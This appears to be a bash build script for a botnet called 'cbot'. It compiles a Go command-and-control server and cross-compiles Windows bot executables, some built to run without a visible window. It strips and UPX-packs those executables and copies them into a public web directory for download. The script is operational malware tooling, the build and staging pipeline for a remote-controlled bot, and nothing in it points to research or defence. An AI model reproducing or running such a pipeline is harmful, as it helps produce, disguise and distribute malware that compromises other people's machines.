#!/bin/bash

echo "Export - Golang"
go mod init cnc

echo "Install - go-sql-driver"
go get -u github.com/go-sql-driver/mysql
echo "Install - shellwords"
go get -u github.com/mattn/go-shellwords

echo "Building - CNC"
go build -o ~/cbot/cbot-cnc ~/cbot/cnc/*.go

mkdir -p release
rm -rf /var/www/html/cbot
mkdir -p /var/www/html/cbot

echo "Building - Res"
rm -f ~/cbot/bot/app.res
x86_64-w64-mingw32-windres ~/cbot/bot/app.rc -O coff -o ~/cbot/bot/app.res

echo "Building - windows_bot"
x86_64-w64-mingw32-gcc -Os -s -static \
    -frename-registers \
    -fomit-frame-pointer \
    -fstack-protector-strong \
    -o release/cbot.exe \
    ~/cbot/bot/*.c \
    ~/cbot/bot/app.res \
    -lws2_32 -lwininet -mwindows

echo "Building - windows_debug"
x86_64-w64-mingw32-gcc -Os -s -static \
    -frename-registers \
    -fomit-frame-pointer \
    -fstack-protector-strong \
    -o release/cbot_debug.exe \
    ~/cbot/bot/*.c \
    ~/cbot/bot/app.res \
    -lws2_32 -lwininet
echo "Building - raw_windows_bot"
x86_64-w64-mingw32-gcc -Os -s -static \
    -frename-registers \
    -fomit-frame-pointer \
    -fstack-protector-strong \
    -o release/raw_cbot.exe \
    ~/cbot/bot/*.c \
    ~/cbot/bot/app.res \
    -lws2_32 -lwininet -mwindows

echo "Building - raw_windows_debug"
x86_64-w64-mingw32-gcc -Os -s -static \
    -frename-registers \
    -fomit-frame-pointer \
    -fstack-protector-strong \
    -o release/raw_cbot_debug.exe \
    ~/cbot/bot/*.c \
    ~/cbot/bot/app.res \
    -lws2_32 -lwininet

strip --strip-all release/cbot_debug.exe
strip --strip-all release/cbot.exe

cp ~/cbot/release/cbot.exe /var/www/html/cbot/
cp ~/cbot/release/raw_cbot.exe /var/www/html/cbot/
cp ~/cbot/release/cbot_debug.exe /var/www/html/cbot/
cp ~/cbot/release/raw_cbot_debug.exe /var/www/html/cbot/

wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --best --ultra-brute /var/www/html/cbot/cbot.exe
./upx --best --ultra-brute /var/www/html/cbot/raw_cbot.exe
./upx --best --ultra-brute /var/www/html/cbot/cbot_debug.exe
./upx --best --ultra-brute /var/www/html/cbot/raw_cbot_debug.exe
rm -rf upx*

echo "Build completed"